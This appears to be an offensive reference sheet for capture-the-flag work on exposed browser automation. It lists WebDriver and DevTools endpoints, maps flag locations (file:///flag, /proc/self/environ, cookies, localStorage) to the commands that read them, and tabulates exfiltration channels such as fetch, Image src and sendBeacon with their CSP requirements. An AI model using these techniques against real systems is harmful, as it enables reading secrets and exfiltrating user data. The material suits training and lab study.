# Extended corpus — the full command and pattern library

## The complete WebDriver endpoint set

| Endpoint | Method | Purpose |
|---|---|---|
| `/session` | POST | create |
| `/session/{id}` | DELETE | destroy |
| `/session/{id}/url` | GET/POST | navigate / current URL |
| `/session/{id}/back` | POST | history back |
| `/session/{id}/forward` | POST | history forward |
| `/session/{id}/refresh` | POST | reload |
| `/session/{id}/title` | GET | page title |
| `/session/{id}/source` | GET | rendered DOM |
| `/session/{id}/screenshot` | GET | PNG |
| `/session/{id}/execute/sync` | POST | sync JS |
| `/session/{id}/execute/async` | POST | async JS |
| `/session/{id}/cookies` | GET/DELETE | jar / clear |
| `/session/{id}/cookies/{name}` | GET/POST/DELETE | one cookie |
| `/session/{id}/element` | POST | find one |
| `/session/{id}/elements` | POST | find all |
| `/session/{id}/element/{e}/click` | POST | click |
| `/session/{id}/element/{e}/value` | POST | type |
| `/session/{id}/element/{e}/text` | GET | element text |
| `/session/{id}/element/{e}/attribute/{n}` | GET | attribute |
| `/session/{id}/timeouts` | GET/POST | command timeouts |
| `/session/{id}/window/rect` | GET/POST | viewport |
| `/session/{id}/window/maximize` | POST | maximize |
| `/session/{id}/frame` | POST | switch frame |
| `/session/{id}/frame/parent` | POST | parent frame |
| `/session/{id}/window` | POST | switch window/handle |
| `/session/{id}/window/handles` | GET | open handles |
| `/status` | GET | driver status/version |
| `/sessions` | GET | active sessions (non-std) |

## The CDP command set (port 9222)

```
GET  /json                -> target list + webSocketDebuggerUrl
GET  /json/version        -> browser version
ws   Page.enable          -> page events
ws   Page.navigate        -> {url}
ws   Page.captureScreenshot -> {data: base64}
ws   Runtime.enable       -> console/exception events
ws   Runtime.evaluate     -> {expression, returnByValue, awaitPromise}
ws   Network.enable       -> request/response events
ws   Network.getResponseBody -> {requestId}
ws   Fetch.enable         -> intercept requests
ws   DOM.getDocument      -> the DOM tree
```

## The flag-location to command map

| Flag lives in | Commands |
|---|---|
| `/flag` file | url `file:///flag` + source |
| env var | url `file:///proc/self/environ` + source |
| internal route | url `localhost/route` + source |
| JS cookie | execute `document.cookie` |
| HttpOnly cookie | GET `/cookies` |
| localStorage | execute `localStorage` |
| same-origin page | execute `fetch('/flag')` |
| rendered image | GET `/screenshot` |
| app source file | url `file:///app/...` + source |

## The reproduction property table

| Property | Source read | Reproduce via |
|---|---|---|
| URL | `goto(url)` arg | `goto(same)` |
| credential | `setCookie`/`login` | `add_cookie`/`fill+click` |
| wait | `setTimeout`/`wait_for` | `wait_for_timeout`/condition |
| flags | `args[]`/`launch` | driver's `args` |
| version | `package.json`/Docker | matching browser install |
| viewport | `setViewport` | `window/rect` |

## The exfil channel table

| Channel | Payload | CSP need | survives nav? |
|---|---|---|---|
| fetch | `fetch(T)` | connect-src | no |
| Image | `new Image().src=T` | img-src | no |
| script | `<script src=T>` | script-src | no |
| beacon | `sendBeacon(T)` | connect-src (loose) | yes |
| nav | `top.location=T` | none | n/a |
| form | `<form action=T>` | form-action | n/a |
| write-back | same-origin write | same-origin | n/a |
